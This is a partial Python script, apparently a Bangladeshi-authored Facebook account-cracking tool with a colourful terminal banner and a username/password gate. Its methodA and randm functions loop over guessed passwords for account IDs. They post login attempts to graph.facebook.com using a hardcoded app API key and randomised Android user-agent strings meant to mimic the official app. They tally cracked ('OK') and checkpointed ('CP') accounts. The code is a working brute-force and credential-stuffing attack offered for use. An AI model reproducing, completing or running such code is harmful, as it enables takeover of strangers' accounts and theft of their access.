...
os.system('clear')
print(f'\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] CHECKING UPDATE...?  ')
os.system("espeak -a 300 \"Checking,Update,\"")
os.system('clear')
print(f'\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] UPDATE VERSION 1.3...! ')
os.system("espeak -a 300 \"UPDATE VERSION 1.3,\"")
try:
    import requests 
except ImportError:
...
\033[1;32m██╔══██║\033[1;31m██╔═██╗ \033[1;32m██╔══██║\033[1;31m╚════██║\033[1;32m██╔══██║
\033[1;32m██║  ██║\033[1;31m██║  ██╗\033[1;32m██║  ██║\033[1;31m███████║\033[1;32m██║  ██║
\033[1;32m╚═╝  ╚═╝\033[1;31m╚═╝  ╚═╝\033[1;32m╚═╝  ╚═╝\033[1;31m╚══════╝\033[1;32m╚═╝  ╚═╝           Pro                                                                                                                        
{A}═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═
{R}({G1}🇧🇩{R}) {G1}DEVELOPER  {R}➠   {G1} AKASH ISlAM 
{R}({G1}🇧🇩{R}) {G1}GITHUB     {R}➠   {Y} MR-AKASH-404 
{R}({G1}🇧🇩{R}) {G1}TOOLS      {R}➠    {G1}FILE RANDAM 
{R}({G1}🇧🇩{R}) {G1}VERSION    {R}➠    {Y}V1.3
{A}═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═""")
...
while attemps < 12345677901:
    username = input('\033[1;91m[\033[1;33m√\033[1;91m]\x1b[38;5;50m \033[41mENTER USERNAME\033[40m: ')
    
    
    os.system("espeak \"ENTER PASSWORD\"")
    password = input('\033[1;95m[\033[1;33m√\033[1;95m]\x1b[38;5;50m\033[41m ENTER PASSWORD\033[40m: ')
...
#__________________[ FILE METHOD M1 ]__________________#           
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/287.1.0.51.119;FBBV/245251844;FBDM/{density=2.0,width=720,height=1362};FBLC/pt_BR;FBRV/0;FBCR/TIM;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/motorola one;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
        ...
        try:
            ...
            for pw in psw:
                ...
                with requests.Session() as session:
                    ...
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': '[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127351;FBDM/{density=1.9125,width=720,height=1400};FBLC/en_US;FBRV/272210345;FBCR/Boost Mobile;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g fast;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
...
def randm(ids,psd):
    global loop,ok,cp
    sys.stdout.write(f"\r{G1}[{A}AKASH-RANDOM{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
            ...
            head={'User-Agent': f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/434.0.0.36.115;FBBV/520732053;FBDM/{density=3.375,width=1080,height=2141};FBLC/it_IT;FBRV/523531639;FBCR/Iliad;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2197;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]',
